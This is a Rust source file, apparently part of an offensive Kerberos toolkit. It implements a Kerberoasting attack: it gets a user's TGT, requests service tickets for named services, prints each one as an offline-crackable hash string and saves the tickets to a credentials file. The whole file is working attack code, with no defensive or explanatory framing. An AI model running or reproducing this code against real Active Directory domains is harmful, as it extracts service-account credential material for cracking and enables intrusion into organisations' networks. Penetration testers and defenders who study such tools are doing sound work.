use crate::core::save_cred_in_file;
use crate::core::CredentialFormat;
use crate::core::KerberosUser;
use crate::core::{get_user_tgt, request_tgs};
use crate::core::{tgs_to_crack_string, CrackFormat};
use crate::error::Result;
use crate::transporter::KerberosTransporter;
use kerberos_crypto::Key;
use log::info;

pub fn kerberoast(
    user: KerberosUser,
    services: Vec<String>,
    creds_file: &str,
    user_key: Option<&Key>,
    transporter: &dyn KerberosTransporter,
    cred_format: CredentialFormat,
    crack_format: CrackFormat,
) -> Result<()> {
    let username = user.name.clone();
    let (mut krb_cred_plain, cred_format, tgt) =
        get_user_tgt(&user, creds_file, user_key, transporter, cred_format)?;

    for service in services {
        match request_tgs(user.clone(), &service, tgt.clone(), transporter) {
            Err(err) => match &err {
                _ => return Err(err),
            },
            Ok(tgs) => {
                let crack_str = tgs_to_crack_string(
                    &username,
                    &service,
                    &tgs.ticket,
                    crack_format,
                );
                println!("{}", crack_str);
                krb_cred_plain.push(tgs);
            }
        }
    }

    info!("Save {} TGSs in {}", username, creds_file);
    save_cred_in_file(creds_file, krb_cred_plain.into(), cred_format)?;

    return Ok(());
}
